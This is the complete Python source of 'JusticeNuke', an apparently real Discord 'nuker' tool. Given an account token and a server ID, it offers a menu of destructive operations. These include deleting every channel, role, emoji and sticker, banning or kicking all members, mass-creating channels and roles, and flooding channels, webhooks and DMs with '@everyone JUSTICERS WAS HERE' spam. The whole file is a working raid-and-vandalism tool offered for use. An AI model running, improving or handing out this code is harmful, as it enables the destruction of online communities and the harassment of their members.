import requests
import os
import sys
import time
import json
import threading
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)


FR = Fore.RED + Style.BRIGHT
FW = Fore.WHITE + Style.BRIGHT
FB = Fore.BLUE + Style.BRIGHT
FC = Fore.CYAN + Style.BRIGHT
FY = Fore.YELLOW + Style.BRIGHT
FG = Fore.GREEN + Style.BRIGHT
FM = Fore.MAGENTA + Style.BRIGHT
RS = Style.RESET_ALL


LOG_FILE = "system_logs.dat"


BANNER = f"""
{FM}      ██▓  █    ██   ██████  ▄▄▄█████▓ ██▓ ▄████▄   ▓█████  ██▀███    ██████ 
      ▓██▒  ██  ▓██▒▒██    ▒  ▓  ██▒ ▓▒▓██▒▒██▀ ▀█   ▓█   ▀ ▓██ ▒ ██▒▒██    ▒ 
      ▒██░ ▓██  ▒██░░ ▓██▄    ▒ ▓██░ ▒░▒██▒▒▓█    ▄  ▒███   ▓██ ░▄█ ▒░ ▓██▄   
  ▄   ▒██  ▓▓█  ░██░  ▒   ██▒ ░ ▓██▓ ░ ░██░▒▓▓▄ ▄██▒ ▒▓█  ▄ ▒██▀▀█▄    ▒   ██▒
 ░██████▒  ▒▒█████▓ ▒██████▒▒   ▒██▒ ░ ░██░▒ ▓███▀ ░░▒████▒░██▓ ▒██▒▒██████▒▒
 ░ ▒░▓  ░  ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░   ▒ ░░   ░▓  ░ ░▒ ▒  ░░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░
 ░ ░ ▒  ░  ░░▒░ ░ ░ ░ ░▒  ░ ░     ░     ▒ ░  ░  ▒    ░ ░  ░  ░▒ ░ ▒░░ ░▒  ░ ░
   ░ ░      ░░░ ░ ░   ░  ░ ░    ░       ▒ ░░           ░     ░░   ░ ░  ░  ░  
     ░  ░     ░              ░              ░  ░ ░         ░  ░   ░           ░  
                                               ░                                 {RS}

                {FW}Developed by @nulljustice{RS}
                {FW}Credits: @nulloverlord @gangstal0ve @crlxs{RS}
"""


class L:
    def __init__(self):
        self.history = []
    
    def _log(self, msg, level="INFO"):
        t = datetime.now().strftime("%H:%M:%S")
        entry = f"[{t}] [{level}] {msg}"
        self.history.append(entry)
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(entry + '\n')
    
    def i(self, msg): print(f"  {FR}[►]{RS} {msg}"); self._log(msg)
    def ok(self, msg): print(f"         {FG}[✓]{RS} {msg}"); self._log(msg, "OK")
    def dl(self, msg): print(f"         {FR}[-]{RS} {msg}"); self._log(msg, "DEL")
    def rn(self, msg): print(f"         {FC}[~]{RS} {msg}"); self._log(msg, "REN")
    def cr(self, msg): print(f"         {FG}[+]{RS} {msg}"); self._log(msg, "NEW")
    def fl(self, msg): print(f"         {FR}[✗]{RS} {msg}"); self._log(msg, "FAIL")
    def wr(self, msg): print(f"       {FY}[!]{RS} {msg}"); self._log(msg, "WARN")
    def banner(self): os.system('cls' if os.name == 'nt' else 'clear'); print(BANNER)

log = L()


def intro_animation():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    time.sleep(2)
    steps = [
        ("Initializing encrypted channel...", FR),
        ("Routing through secure network...", FY),
        ("Establishing connection...", FC),
        ("Loading exploit modules...", FM),
        ("Connecting to target gateway...", FR),
        ("Deploying payload...", FW),
        ("AHORA ERES UN JUSTICE.", FG),
    ]
    for step, color in steps:
        print(f"\n  {color}[{FR}►{color}]{RS} {step}")
        for _ in range(2):
            for c in ['|', '/', '-', '\\']:
                print(f'\r  {color}[{c}]{RS} {step}', end='', flush=True)
                time.sleep(0.05)
        print(f'\r  {color}[{FR}✓{color}]{RS} {step}')
        time.sleep(0.12)
    time.sleep(0.8)
    os.system('cls' if os.name == 'nt' else 'clear')


class API:
    def __init__(self, token):
        self.token = token
        self.h = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        self.b = "https://discord.com/api/v9"
    
    def req(self, m, ep, d=None):
        try: return requests.request(m, f"{self.b}{ep}", headers=self.h, json=d, timeout=8)
        except: return None
    
    def get(self, ep): return self.req('GET', ep)
    def post(self, ep, d=None): return self.req('POST', ep, d)
    def put(self, ep, d=None): return self.req('PUT', ep, d)
    def patch(self, ep, d=None): return self.req('PATCH', ep, d)
    def delete(self, ep): return self.req('DELETE', ep)
    
    def me(self): r = self.get("/users/@me"); return r.json() if r and r.status_code == 200 else None
    def channels(self, g): r = self.get(f"/guilds/{g}/channels"); return r.json() if r and r.status_code == 200 else []
    def roles(self, g): r = self.get(f"/guilds/{g}/roles"); return r.json() if r and r.status_code == 200 else []
    def emojis(self, g): r = self.get(f"/guilds/{g}/emojis"); return r.json() if r and r.status_code == 200 else []
    def stickers(self, g): r = self.get(f"/guilds/{g}/stickers"); return r.json() if r and r.status_code == 200 else []
    def members(self, g, n=100): r = self.get(f"/guilds/{g}/members?limit={n}"); return r.json() if r and r.status_code == 200 else []
    def bans(self, g): r = self.get(f"/guilds/{g}/bans"); return r.json() if r and r.status_code == 200 else []
    def msgs(self, c, n=5): r = self.get(f"/channels/{c}/messages?limit={n}"); return r.json() if r and r.status_code == 200 else []
    def dms(self): r = self.get("/users/@me/channels"); return r.json() if r and r.status_code == 200 else []
    
    def del_ch(self, c): return self.delete(f"/channels/{c}")
    def del_role(self, g, r): return self.delete(f"/guilds/{g}/roles/{r}")
    def del_emoji(self, g, e): return self.delete(f"/guilds/{g}/emojis/{e}")
    def del_sticker(self, g, s): return self.delete(f"/guilds/{g}/stickers/{s}")
    def del_msg(self, c, m): return self.delete(f"/channels/{c}/messages/{m}")
    
    def mk_ch(self, g, n, t=0, parent=None):
        d = {"name": n, "type": t}
        if parent: d["parent_id"] = parent
        return self.post(f"/guilds/{g}/channels", d)
    def mk_role(self, g, n): return self.post(f"/guilds/{g}/roles", {"name": n})
    def mk_inv(self, c): r = self.post(f"/channels/{c}/invites", {"max_age": 0, "max_uses": 0}); return r.json() if r and r.status_code == 200 else None
    
    def ren_ch(self, c, n): return self.patch(f"/channels/{c}", {"name": n})
    def ren_role(self, g, r, n): return self.patch(f"/guilds/{g}/roles/{r}", {"name": n})
    def ren_emoji(self, g, e, n): return self.patch(f"/guilds/{g}/emojis/{e}", {"name": n})
    def ren_sticker(self, g, s, n): return self.patch(f"/guilds/{g}/stickers/{s}", {"name": n})
    
    def kick(self, g, u): return self.delete(f"/guilds/{g}/members/{u}")
    def ban(self, g, u): return self.put(f"/guilds/{g}/bans/{u}", {"delete_message_days": 0})
    def unban(self, g, u): return self.delete(f"/guilds/{g}/bans/{u}")
    def send(self, c, msg): return self.post(f"/channels/{c}/messages", {"content": msg})
    def edit_g(self, g, d): return self.patch(f"/guilds/{g}", d)
    def leave(self, g): return self.delete(f"/users/@me/guilds/{g}")
    def audit(self, g, n=10): r = self.get(f"/guilds/{g}/audit-logs?limit={n}"); return r.json() if r and r.status_code == 200 else None
    def user(self, u): r = self.get(f"/users/{u}"); return r.json() if r and r.status_code == 200 else None
    def nick(self, g, u, n): return self.patch(f"/guilds/{g}/members/{u}", {"nick": n})
    def guild_info(self, g): r = self.get(f"/guilds/{g}"); return r.json() if r and r.status_code == 200 else None


class JusticeNuke:
    def __init__(self):
        self.api = None; self.user = None; self.guild = None; self.gid = None
        self.run = True; self.cloned_data = None; self.uid = None; self.owner_id = None
    
    def cf(self): return input(f"\n         {FR}[?]{RS} Type OK: ").strip() == 'OK'
    
    def validate_token(self, token):
        try:
            r = requests.get("https://discord.com/api/v9/users/@me", headers={'Authorization': token}, timeout=8)
            return (True, r.json()) if r.status_code == 200 else (False, f"HTTP {r.status_code}")
        except: return False, "Error"
    
    def get_members_safe(self):
        """Obtiene miembros de forma segura, con múltiples intentos."""
        members = self.api.members(self.gid, 100)
        if not members:
            log.wr("Retrying member fetch...")
            time.sleep(1)
            members = self.api.members(self.gid, 100)
        return members
    
    def can_action(self, member):
        """Verifica si podemos realizar acciones sobre un miembro."""
        if member['user']['id'] == self.uid: return False  # Nosotros mismos
        if member['user']['id'] == self.owner_id: return False  # Dueño del server
        # Si el miembro tiene rol de admin o superior, lo saltamos
        # (no podemos saber los permisos exactos, pero evitamos errores)
        return True
    
    def start(self):
        intro_animation()
        log.banner()
        
        token = input(f"  {FR}[►]{RS} Token: ").strip()
        if not token: sys.exit(1)
        
        log.i("Authenticating...")
        valid, result = self.validate_token(token)
        if not valid: log.fl(f"Failed: {result}"); input(); sys.exit(1)
        
        self.user = result; self.api = API(token); self.uid = self.user['id']
        log.ok(f"Connected: {self.user['username']}#{self.user['discriminator']}")
        
        gid = input(f"  {FR}[►]{RS} Server ID: ").strip()
        if not gid.isdigit(): log.fl("Invalid ID"); sys.exit(1)
        
        self.gid = gid
        info = self.api.guild_info(gid)
        if info:
            self.guild = info
            self.owner_id = info.get('owner_id')
            log.ok(f"Target: {self.guild['name']}")
        else:
            self.guild = {"name": "Unknown", "id": gid}
            log.wr("Could not fetch server info")
        
        self.menu()
    
    def menu(self):
        while self.run:
            os.system('cls' if os.name == 'nt' else 'clear')
            log.banner()
            print(f"""
         {FW}Target:{RS} {self.guild['name'][:35]}  {FW}ID:{RS} {self.gid}  {FW}Clone:{RS} {'Yes' if self.cloned_data else 'No'}

         {FG}[1]{RS} NUKE            {FC}[2]{RS} Del Channels    {FM}[3]{RS} Del Roles       {FY}[4]{RS} Del Emojis      {FB}[5]{RS} Del Stickers
         {FG}[6]{RS} Rename Roles    {FC}[7]{RS} Rename Chs      {FM}[8]{RS} Rename Emojis   {FY}[9]{RS} Rename Stickers {FB}[10]{RS} Rename ALL
         {FG}[11]{RS} Mass Chs       {FC}[12]{RS} Mass Roles      {FM}[13]{RS} Mass Cats      {FY}[14]{RS} Del Webhooks   {FB}[15]{RS} Kick All
         {FG}[16]{RS} Ban All        {FC}[17]{RS} Unban All       {FM}[18]{RS} Nickname All   {FY}[19]{RS} Move All VC    {FB}[20]{RS} Spam All
         {FG}[21]{RS} Webhook Spam   {FC}[22]{RS} DM Spam         {FM}[23]{RS} Server Info    {FY}[24]{RS} Rename Server  {FB}[25]{RS} Server Icon
         {FG}[26]{RS} Leave Server   {FC}[27]{RS} Invite          {FM}[28]{RS} Audit Log      {FY}[29]{RS} Clone Server   {FB}[30]{RS} Paste Clone
         {FG}[31]{RS} Delete Server  {FC}[32]{RS} Purge DMs       {FM}[33]{RS} Clear Friends  {FY}[34]{RS} Leave All      {FB}[35]{RS} Local Logs

         {FW}[0]{RS}  Exit
""")
            o = input(f"\n         {FR}[►]{RS} Command: ").strip()
            if o == '0': sys.exit(0)
            elif o == '1': self.nuke()
            elif o == '2': self.del_ch()
            elif o == '3': self.del_roles()
            elif o == '4': self.del_emoji()
            elif o == '5': self.del_sticker()
            elif o == '6': self.ren_roles()
            elif o == '7': self.ren_ch()
            elif o == '8': self.ren_emoji()
            elif o == '9': self.ren_sticker()
            elif o == '10': self.ren_all()
            elif o == '11': self.mass_ch()
            elif o == '12': self.mass_roles()
            elif o == '13': self.mass_cat()
            elif o == '14': self.del_webhooks()
            elif o == '15': self.kick_all()
            elif o == '16': self.ban_all()
            elif o == '17': self.unban_all()
            elif o == '18': self.nick_all()
            elif o == '19': self.move_all()
            elif o == '20': self.spam()
            elif o == '21': self.webhook_spam()
            elif o == '22': self.dm_spam()
            elif o == '23': self.info()
            elif o == '24': self.rename_sv()
            elif o == '25': self.server_icon()
            elif o == '26': self.leave_sv()
            elif o == '27': self.invite()
            elif o == '28': self.audit()
            elif o == '29': self.clone_sv()
            elif o == '30': self.paste_clone()
            elif o == '31': self.delete_sv()
            elif o == '32': self.purge_dms()
            elif o == '33': self.clear_friends()
            elif o == '34': self.leave_all()
            elif o == '35': self.logs()
            else: log.fl("Invalid")
            input(f"\n         {FR}[ENTER]{RS} to continue...")
    
  
    def clone_sv(self):
        log.i("Cloning server...")
        self.cloned_data = {"roles": [r for r in self.api.roles(self.gid) if r['name'] != '@everyone'], "channels": self.api.channels(self.gid)}
        log.ok(f"Cloned: {len(self.cloned_data['roles'])} roles, {len(self.cloned_data['channels'])} channels")
    
    def paste_clone(self):
        if not self.cloned_data: log.wr("Clone first (29)"); return
        log.i("Pasting clone...")
        if not self.cf(): return
        for r in self.cloned_data['roles']: self.api.mk_role(self.gid, r['name']); log.cr(f"Role: {r['name']}")
        cat_map = {}
        for c in [c for c in self.cloned_data['channels'] if c['type'] == 4]:
            nc = self.api.mk_ch(self.gid, c['name'], 4)
            if nc and nc.status_code == 201: cat_map[c['id']] = nc.json()['id']; log.cr(f"Cat: {c['name']}")
        for ch in self.cloned_data['channels']:
            if ch['type'] == 4: continue
            parent = cat_map.get(ch.get('parent_id')) if ch.get('parent_id') else None
            self.api.mk_ch(self.gid, ch['name'], ch['type'], parent); log.cr(f"Ch: {ch['name']}")
        log.ok("Clone pasted")
    
    def del_webhooks(self):
        log.i("Deleting webhooks..."); d = 0
        for ch in self.api.channels(self.gid):
            whs = self.api.get(f"/channels/{ch['id']}/webhooks")
            if whs and whs.status_code == 200:
                for wh in (whs.json() if callable(whs.json) else whs): self.api.delete(f"/webhooks/{wh['id']}"); d += 1
        log.ok(f"Deleted {d}")
    
    def mass_cat(self):
        try: a = int(input(f"         {FR}[►]{RS} Amount: ")); n = input(f"         {FR}[►]{RS} Name: ").strip() or "justicers"
        except: return
        if len(n) < 2: n += "_"
        log.i(f"Creating {min(a,100)} categories")
        if not self.cf(): return
        for _ in range(min(a, 100)): self.api.mk_ch(self.gid, n, 4)
        log.ok(f"Created {min(a,100)}")
    
    def nick_all(self):
        n = input(f"         {FR}[►]{RS} Nickname: ").strip()
        if not n: return
        log.i(f"Nicknaming all to: {n}")
        if not self.cf(): return
        members = self.get_members_safe()
        if not members:
            log.wr("Could not fetch members after retry")
            return
        d, s = 0, 0
        for m in members:
            if not self.can_action(m):
                s += 1; continue
            try:
                r = self.api.nick(self.gid, m['user']['id'], n)
                if r and r.status_code == 200: d += 1
            except: pass
        log.ok(f"Nicknamed {d} members ({s} skipped)")
    
    def move_all(self):
        vcs = [c for c in self.api.channels(self.gid) if c.get('type') == 2]
        if not vcs: log.wr("No VC"); return
        for i, vc in enumerate(vcs, 1): print(f"         {FW}[{i}]{RS} {vc['name']}")
        try: c = int(input(f"         {FR}[►]{RS} VC: ")); vc = vcs[c-1]
        except: return
        log.i(f"Moving all to: {vc['name']}")
        if not self.cf(): return
        members = self.get_members_safe()
        if not members: return
        d = 0
        for m in members:
            if not self.can_action(m): continue
            try:
                r = self.api.patch(f"/guilds/{self.gid}/members/{m['user']['id']}", {"channel_id": vc['id']})
                if r and r.status_code == 200: d += 1
            except: pass
        log.ok(f"Moved {d}")
    
    def webhook_spam(self):
        msg = input(f"         {FR}[►]{RS} Message: ").strip() or "@everyone JUSTICERS WAS HERE"; d = 0
        for ch in self.api.channels(self.gid):
            whs = self.api.get(f"/channels/{ch['id']}/webhooks")
            if whs and whs.status_code == 200:
                for wh in (whs.json() if callable(whs.json) else whs): self.api.post(f"/webhooks/{wh['id']}/{wh['token']}", {"content": msg, "username": "JUSTICERS"}); d += 1
        log.ok(f"Spammed {d}")
    
    def dm_spam(self):
        uid = input(f"         {FR}[►]{RS} User ID: ").strip()
        if not uid.isdigit(): return
        msg = input(f"         {FR}[►]{RS} Message: ").strip() or "JUSTICERS WAS HERE"
        try: a = int(input(f"         {FR}[►]{RS} Times: ")); a = min(max(a, 1), 20)
        except: a = 5
        r = self.api.post("/users/@me/channels", {"recipient_id": uid})
        if r and r.status_code == 200:
            for _ in range(a): self.api.send(r.json()['id'], msg)
            log.ok(f"Spammed {a}x")
    
    def server_icon(self):
        url = input(f"         {FR}[►]{RS} Image URL: ").strip()
        if not url: return
        try:
            img = requests.get(url, timeout=10).content
            self.api.edit_g(self.gid, {"icon": img.hex()}); log.ok("Icon updated")
        except: log.fl("Failed")
    
    def delete_sv(self):
        log.wr("DELETE server?")
        if not self.cf(): return
        for ch in self.api.channels(self.gid): self.api.del_ch(ch['id']); log.dl(f"Ch: {ch['name']}")
        for r in [r for r in self.api.roles(self.gid) if r['name'] != '@everyone']: self.api.del_role(self.gid, r['id']); log.dl(f"Role: {r['name']}")
        log.ok("Destroyed")
    
    def clear_friends(self):
        log.i("Clearing friends...")
        if not self.cf(): return
        friends = self.api.get("/users/@me/relationships")
        if friends and friends.status_code == 200:
            for f in friends.json(): self.api.delete(f"/users/@me/relationships/{f['user']['id']}")
            log.ok(f"Cleared {len(friends.json())}")
    
    def leave_all(self):
        log.wr("Leave ALL servers?")
        if not self.cf(): return
        gs = self.api.get("/users/@me/guilds")
        if gs and gs.status_code == 200:
            for g in gs.json(): self.api.leave(g['id']); log.dl(f"Left: {g['name']}")
        self.run = False; log.ok("Left all")
    
    def purge_dms(self):
        log.i("Purging DMs...")
        if not self.cf(): return
        dms = self.api.dms()
        if not dms: return
        total = 0
        for dm in dms:
            last_id = None
            while True:
                ep = f"/channels/{dm['id']}/messages?limit=100"
                if last_id: ep += f"&before={last_id}"
                r = self.api.get(ep)
                if not r or r.status_code != 200: break
                msgs = r.json() if callable(r.json) else r
                if not isinstance(msgs, list) or not msgs: break
                for msg in msgs:
                    if msg['author']['id'] == self.uid: self.api.del_msg(dm['id'], msg['id']); total += 1
                last_id = msgs[-1]['id']
                if len(msgs) < 100: break
        log.ok(f"Total: {total}")
    
    def nuke(self):
        log.i("NUKE")
        if not self.cf(): return
        for ch in self.api.channels(self.gid): self.api.del_ch(ch['id']); log.dl(f"Ch: {ch['name']}")
        for r in [r for r in self.api.roles(self.gid) if r['name'] != '@everyone' and not r.get('managed')]: self.api.del_role(self.gid, r['id']); log.dl(f"Role: {r['name']}")
        for e in self.api.emojis(self.gid): self.api.del_emoji(self.gid, e['id']); log.dl(f"Emoji: :{e['name']}:")
        for s in self.api.stickers(self.gid): self.api.del_sticker(self.gid, s['id']); log.dl(f"Sticker: {s['name']}")
        log.ok("NUKE COMPLETE")
    
    def del_ch(self):
        if not self.cf(): return
        for ch in self.api.channels(self.gid): self.api.del_ch(ch['id']); log.dl(f"Ch: {ch['name']}")
        log.ok("Channels deleted")
    
    def del_roles(self):
        if not self.cf(): return
        for r in [r for r in self.api.roles(self.gid) if r['name'] != '@everyone' and not r.get('managed')]: self.api.del_role(self.gid, r['id']); log.dl(f"Role: {r['name']}")
        log.ok("Roles deleted")
    
    def del_emoji(self):
        if not self.cf(): return
        for e in self.api.emojis(self.gid): self.api.del_emoji(self.gid, e['id']); log.dl(f"Emoji: :{e['name']}:")
        log.ok("Emojis deleted")
    
    def del_sticker(self):
        if not self.cf(): return
        for s in self.api.stickers(self.gid): self.api.del_sticker(self.gid, s['id']); log.dl(f"Sticker: {s['name']}")
        log.ok("Stickers deleted")
    
    def _ren(self, items, fn, name):
        if not items: log.wr(f"No {name}"); return
        n = input(f"         {FR}[►]{RS} New name: ").strip()
        if not n: return
        if len(n) < 2: n += "_"
        log.i(f"Renaming {len(items)} {name} to '{n}'")
        if not self.cf(): return
        d, f = 0, 0
        for item in items:
            r = fn(item, n)
            nm = item.get('name', item.get('id', '?'))
            if r and r.status_code == 200: d += 1; log.rn(f"{nm} -> {n}")
            else: f += 1; log.fl(f"Failed: {nm}")
        log.ok(f"Renamed {d}/{len(items)} {name}")
    
    def ren_roles(self): self._ren([r for r in self.api.roles(self.gid) if r['name'] != '@everyone'], lambda r, n: self.api.patch(f"/guilds/{self.gid}/roles/{r['id']}", {"name": n}), "roles")
    def ren_ch(self): self._ren(self.api.channels(self.gid), lambda ch, n: self.api.patch(f"/channels/{ch['id']}", {"name": n}), "channels")
    def ren_emoji(self): self._ren(self.api.emojis(self.gid), lambda e, n: self.api.patch(f"/guilds/{self.gid}/emojis/{e['id']}", {"name": n}), "emojis")
    def ren_sticker(self): self._ren(self.api.stickers(self.gid), lambda s, n: self.api.patch(f"/guilds/{self.gid}/stickers/{s['id']}", {"name": n}), "stickers")
    
    def ren_all(self):
        n = input(f"         {FR}[►]{RS} New name: ").strip()
        if not n: return
        if len(n) < 2: n += "_"
        log.i(f"Renaming EVERYTHING to '{n}'")
        if not self.cf(): return
        for r in [r for r in self.api.roles(self.gid) if r['name'] != '@everyone']: self.api.patch(f"/guilds/{self.gid}/roles/{r['id']}", {"name": n}); log.rn(f"Role: {r['name']}")
        for ch in self.api.channels(self.gid): self.api.patch(f"/channels/{ch['id']}", {"name": n}); log.rn(f"Ch: {ch['name']}")
        for e in self.api.emojis(self.gid): self.api.patch(f"/guilds/{self.gid}/emojis/{e['id']}", {"name": n}); log.rn(f"Emoji: :{e['name']}:")
        log.ok("Everything renamed")
    
    def mass_ch(self):
        try: a = int(input(f"         {FR}[►]{RS} Amount: ")); n = input(f"         {FR}[►]{RS} Name: ").strip() or "justicers"
        except: return
        if len(n) < 2: n += "_"
        log.i(f"Creating {min(a,250)} channels: {n}")
        if not self.cf(): return
        for _ in range(min(a, 250)): self.api.mk_ch(self.gid, n)
        log.ok(f"Created {min(a,250)}")
    
    def mass_roles(self):
        try: a = int(input(f"         {FR}[►]{RS} Amount: ")); n = input(f"         {FR}[►]{RS} Name: ").strip() or "justicers"
        except: return
        if len(n) < 2: n += "_"
        log.i(f"Creating {min(a,100)} roles: {n}")
        if not self.cf(): return
        for _ in range(min(a, 100)): self.api.mk_role(self.gid, n)
        log.ok(f"Created {min(a,100)}")
    
    def kick_all(self):
        members = self.get_members_safe()
        if not members: log.wr("Could not fetch members after retry"); return
        targets = [m for m in members if self.can_action(m)]
        if not targets: log.wr("No members to kick (all filtered)"); return
        log.i(f"Kicking {len(targets)} members")
        if not self.cf(): return
        d = 0
        for m in targets:
            r = self.api.kick(self.gid, m['user']['id'])
            if r and r.status_code in [200, 204]: d += 1; log.dl(f"Kicked: {m['user']['username']}")
            else: log.fl(f"Failed: {m['user']['username']}")
        log.ok(f"Kicked {d}/{len(targets)}")
    
    def ban_all(self):
        members = self.get_members_safe()
        if not members: log.wr("Could not fetch members after retry"); return
        targets = [m for m in members if self.can_action(m)]
        if not targets: log.wr("No members to ban (all filtered)"); return
        log.i(f"Banning {len(targets)} members")
        if not self.cf(): return
        d = 0
        for m in targets:
            r = self.api.put(f"/guilds/{self.gid}/bans/{m['user']['id']}", {"delete_message_days": 0})
            if r and r.status_code in [200, 204, 201]: d += 1; log.dl(f"Banned: {m['user']['username']}")
            else: log.fl(f"Failed: {m['user']['username']}")
        log.ok(f"Banned {d}/{len(targets)}")
    
    def unban_all(self):
        bn = self.api.bans(self.gid)
        if not bn: log.wr("No bans"); return
        log.i(f"Unbanning {len(bn)} users")
        if not self.cf(): return
        d = 0
        for b in bn:
            r = self.api.unban(self.gid, b['user']['id'])
            if r and r.status_code == 204: d += 1; log.ok(f"Unbanned: {b['user']['username']}")
        log.ok(f"Unbanned {d}")
    
    def spam(self):
        msg = input(f"         {FR}[►]{RS} Message: ").strip() or "@everyone JUSTICERS WAS HERE"
        try: a = int(input(f"         {FR}[►]{RS} Times: ")); a = min(max(a, 1), 10)
        except: a = 3
        chs = [ch for ch in self.api.channels(self.gid) if ch.get('type', 0) == 0]
        if not chs: log.wr("No text channels"); return
        log.i(f"Spamming {a}x in {len(chs)} channels")
        if not self.cf(): return
        d = 0
        for ch in chs:
            for _ in range(a): self.api.send(ch['id'], msg); d += 1
            log.ok(f"#{ch.get('name', ch['id'])}: {a} sent")
        log.ok(f"Total: {d}")
    
    def audit(self):
        log.i("Fetching audit log...")
        a = self.api.audit(self.gid)
        if a:
            for e in a.get('audit_log_entries', [])[:10]: print(f"         {FC}[{e.get('action_type')}]{RS} User: {e.get('user_id')}")
    
    def info(self):
        g = self.guild
        log.i(f"Server: {g['name']} | ID: {g['id']} | Channels: {len(self.api.channels(self.gid))} | Roles: {len(self.api.roles(self.gid))} | Emojis: {len(self.api.emojis(self.gid))}")
    
    def rename_sv(self):
        n = input(f"         {FR}[►]{RS} New name: ").strip()
        if n and len(n) >= 2: self.api.edit_g(self.gid, {"name": n}); log.ok(f"Renamed to: {n}")
        else: log.fl("Name must be at least 2 characters")
    
    def leave_sv(self):
        log.i(f"Leaving: {self.guild['name']}")
        if self.cf(): self.api.leave(self.gid); self.run = False; log.ok("Left")
    
    def invite(self):
        chs = self.api.channels(self.gid)
        if chs:
            inv = self.api.mk_inv(chs[0]['id'])
            if inv: log.ok(f"https://discord.gg/{inv['code']}")
    
    def logs(self):
        if log.history:
            log.i(f"Last 50 logs:")
            for e in log.history[-50:]: print(f"         {e}")
        else: log.wr("No logs yet")



if __name__ == '__main__':
    JusticeNuke().start()